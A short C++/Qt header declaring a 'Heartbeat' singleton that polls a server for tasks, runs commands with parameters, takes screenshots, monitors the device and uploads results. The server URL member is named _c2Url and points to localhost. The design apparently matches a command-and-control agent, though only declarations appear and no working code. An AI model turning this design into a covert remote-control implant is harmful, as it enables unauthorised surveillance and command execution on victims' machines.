#pragma once

#include <QObject>
#include <QTimer>
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>

namespace Core {

class Heartbeat : public QObject {
    Q_OBJECT
public:
    static Heartbeat& Instance();
    void start();

private:
    Heartbeat();
    ~Heartbeat() = default;

    void sendHeartbeat();
    void checkTasks();
    void executeTask(const QString& taskId, const QString& command, const QString& params);
    void performMonitor();
    void performScreenshot(const QString& taskId);
    void uploadResult(const QString& taskId, const QString& result, const QString& status = "completed");
    QString getOrCreateUuid();
    
    QTimer _timer;
    QTimer _monitorTimer;
    QString _monitorTaskId;
    QString _deviceUuid;
    QNetworkAccessManager _network;
    QString _c2Url = "http://localhost:8101"; // Base URL without /api prefix as we add it in request
};

} // namespace Core
